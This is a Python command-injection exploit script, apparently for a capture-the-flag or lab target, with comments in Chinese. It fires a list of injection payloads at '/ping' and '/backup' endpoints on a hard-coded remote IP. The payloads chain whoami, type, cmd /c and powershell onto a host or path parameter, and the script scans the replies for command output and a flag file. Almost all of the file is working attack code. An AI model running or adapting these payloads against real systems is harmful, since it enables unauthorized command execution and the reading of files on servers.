import requests
import re
import os
import urllib.parse

os.environ.pop('HTTP_PROXY', None)
os.environ.pop('HTTPS_PROXY', None)
requests.packages.urllib3.disable_warnings()

TARGET = "http://119.29.238.216:8088"
session = requests.Session()
session.verify = False
session.proxies = {}
session.headers.update({"User-Agent": "Mozilla/5.0"})

print("="*70)
print("深度命令执行测试")
print("="*70)

# 测试Ping功能
print("\n测试Ping功能...")

# 构造各种payload
ping_tests = [
    # 基本命令
    ("127.0.0.1", "正常Ping"),
    ("127.0.0.1&whoami", "&符号"),
    ("127.0.0.1&&whoami", "&&符号"),
    ("127.0.0.1|whoami", "|符号"),
    ("127.0.0.1;whoami", ";符号"),
    
    # 带空格的命令
    ("127.0.0.1&type F:\\flag.txt", "&+type"),
    ("127.0.0.1&&type F:\\flag.txt", "&&+type"),
    ("127.0.0.1|type F:\\flag.txt", "|+type"),
    ("127.0.0.1;type F:\\flag.txt", ";+type"),
    
    # 其他路径
    ("127.0.0.1&type F:\\small peoject\\python-lab\\flag.txt", "完整路径"),
    
    # 使用cmd
    ("127.0.0.1&cmd /c type F:\\flag.txt", "cmd /c"),
    ("127.0.0.1&cmd/c type F:\\flag.txt", "cmd/c无空格"),
    
    # 使用powershell
    ("127.0.0.1&powershell -c \"type F:\\flag.txt\"", "powershell"),
    
    # 使用换行符
    ("127.0.0.1\nwhoami", "换行符"),
    ("127.0.0.1%0awhoami", "URL编码换行"),
    
    # 使用反引号
    ("127.0.0.1`whoami`", "反引号"),
    
    # 使用$(...)
    ("127.0.0.1$(whoami)", "$()"),
    
    # 不带IP
    ("&whoami", "&无IP"),
    ("&&whoami", "&&无IP"),
    ("|whoami", "|无IP"),
    (";whoami", ";无IP"),
    
    # 使用括号
    ("(127.0.0.1)&whoami", "括号"),
    
    # 使用引号
    ('"127.0.0.1"&whoami', "双引号"),
    ("'127.0.0.1'&whoami", "单引号"),
    
    # 使用变量
    ("127.0.0.1&echo %PATH%", "环境变量"),
    
    # 使用重定向
    ("127.0.0.1>test.txt", "重定向"),
]

for payload, desc in ping_tests:
    try:
        r = session.get(f"{TARGET}/ping", params={"host": payload}, timeout=15)
        if r.status_code == 200:
            body = re.search(r'<pre>(.*?)</pre>', r.text, re.DOTALL)
            if body:
                content = body.group(1).strip()
                
                # 分析响应内容
                if len(content) > 50:
                    # 检查是否Blocked
                    if "Blocked" in content:
                        print(f"[BLOCKED] {desc}: {payload}")
                    else:
                        # 检查是否有额外输出（命令执行结果）
                        # ping输出通常包含"正在 Ping"、"字节"、"TTL"等
                        # 命令执行结果通常不包含这些
                        
                        lines = content.split('\n')
                        # 过滤掉ping相关行
                        non_ping_lines = []
                        for line in lines:
                            line_lower = line.lower()
                            if 'ping' not in line_lower and '字节' not in line_lower and 'ttl' not in line_lower and '统计' not in line_lower and '丢失' not in line_lower and '往返' not in line_lower and 'ms' not in line_lower and '127.0.0.1' not in line_lower and 'reply' not in line_lower and 'packets' not in line_lower and 'sent' not in line_lower and 'received' not in line_lower and 'lost' not in line_lower and 'minimum' not in line_lower and 'maximum' not in line_lower and 'average' not in line_lower:
                                if line.strip():  # 只保留非空行
                                    non_ping_lines.append(line)
                        
                        if non_ping_lines:
                            print(f"\n>>> {desc}: {payload}")
                            print(f"额外输出: {non_ping_lines[:10]}")
                            
                            # 搜索flag
                            full_output = '\n'.join(non_ping_lines)
                            flag_match = re.search(r'flag\{[^}]+\}', full_output, re.IGNORECASE)
                            if flag_match:
                                print(f"\n🚩🚩🚩 FLAG FOUND: {flag_match.group(0)} 🚩🚩🚩")
                                exit(0)
                            
                            # 检查是否有系统信息输出
                            if 'whoami' in payload.lower() and any(line for line in non_ping_lines):
                                print(f"WHOAMI输出: {non_ping_lines}")
                            
                            if 'type' in payload.lower() and any(line for line in non_ping_lines):
                                print(f"TYPE输出: {non_ping_lines}")
    except Exception as e:
        pass

print("\n" + "="*70)
print("测试Backup功能")
print("="*70)

backup_tests = [
    ("F:\\small peoject\\python-lab\\uploads", "正常路径"),
    ("F:\\small peoject\\python-lab\\uploads&whoami", "&符号"),
    ("F:\\small peoject\\python-lab\\uploads&&whoami", "&&符号"),
    ("F:\\small peoject\\python-lab\\uploads|whoami", "|符号"),
    ("F:\\small peoject\\python-lab\\uploads;whoami", ";符号"),
    ("F:\\small peoject\\python-lab\\uploads&type F:\\flag.txt", "&+type"),
    ("F:\\small peoject\\python-lab\\uploads&&type F:\\flag.txt", "&&+type"),
]

for payload, desc in backup_tests:
    try:
        r = session.get(f"{TARGET}/backup", params={"path": payload}, timeout=15)
        if r.status_code == 200:
            body = re.search(r'<pre>(.*?)</pre>', r.text, re.DOTALL)
            if body:
                content = body.group(1).strip()
                
                if len(content) > 20:
                    if "Blocked" in content:
                        print(f"[BLOCKED] {desc}: {payload}")
                    else:
                        # 检查是否有命令执行输出
                        lines = content.split('\n')
                        file_list = [line for line in lines if line.strip() and '.' in line]  # 文件列表
                        cmd_output = [line for line in lines if line.strip() and '.' not in line and 'Blocked' not in line]
                        
                        if cmd_output and len(cmd_output) > 0:
                            print(f"\n>>> {desc}: {payload}")
                            print(f"命令输出: {cmd_output}")
                            
                            flag_match = re.search(r'flag\{[^}]+\}', '\n'.join(cmd_output), re.IGNORECASE)
                            if flag_match:
                                print(f"\n🚩🚩🚩 FLAG FOUND: {flag_match.group(0)} 🚩🚩🚩")
                                exit(0)
    except:
        pass

print("\n" + "="*70)
print("测试完成")
print("="*70)